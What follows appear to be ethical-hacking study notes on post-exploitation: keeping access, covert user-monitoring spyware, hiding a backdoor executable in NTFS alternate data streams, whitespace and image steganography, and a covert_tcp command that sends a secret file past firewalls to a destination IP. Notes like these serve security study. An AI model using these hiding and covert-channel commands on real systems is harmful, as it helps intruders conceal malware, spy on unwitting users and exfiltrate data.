# MAINTAINING ACCESS
* scripts can be run in the victim system (after exploiting) to send a connection request every few minutes or hours. (persistent connection)
* Power Spy is a computer activity monitoring software that allows you to secretly log all users on a PC while they are unaware. After the software is installed on the PC, you can remotely receive log reports on any device via email or FTP.
* SpyAgent provides a large array of essential computer monitoring features as well as website, application, and chat-client blocking, lockdown scheduling, and the remote delivery of logs via email or FTP. <br>

# HIDING FILES
### HIDING FILES USING NTFS STREAMS
* create a folder
* store an exe in the folder
* create a txt file with some dummy text
* run command: ```[exe path] > [txt path]:[exe name]``` this will hide the exe in the text file
* delete the original exe file
* create a link by running the command ```mklink backdoor.exe [txt path]:[exe name]```
* run the hidden exe by running ```backdoor.exe```

### WHITE SPACE STEGANOGRAPHY
Whitespace steganography is used to conceal messages in ASCII text by adding white spaces to the end of the lines. Because spaces and tabs are generally not visible in text viewers, the message is effectively hidden from casual observers. <br>
we can use a tool called "snow"
* create a text file with some sample text
* navigate to the folder containing the snow tool
* run command ```snow -C -m "secret text" -p "password" sampleText.txt hiddentext.txt```
* the data will be hidden in hiddentext.txt
* to extract the data, run command ```snow -C -p "password" hiddentext.txt```

### IMAGE STEGANOGRAPHY
Tools like Steghide, OpenStego etc can be used to hide text files in images

### CONVERT CHANNELS USING Convert_TCP
The Covert_TCP program manipulates the TCP/IP header of the data packets to send a file one byte at a time from any host to a destination. It can act like a server as well as a client and can be used to hide the data transmitted inside an IP header. This is useful when bypassing firewalls and sending data with legitimate-looking packets that contain no data for sniffers to analyze. <br>
usage: <br>```./covert_tcp -dest [dest IP] -source [source IP] -source_port [source port] -dest_port [dest port] -file [secret file path]```
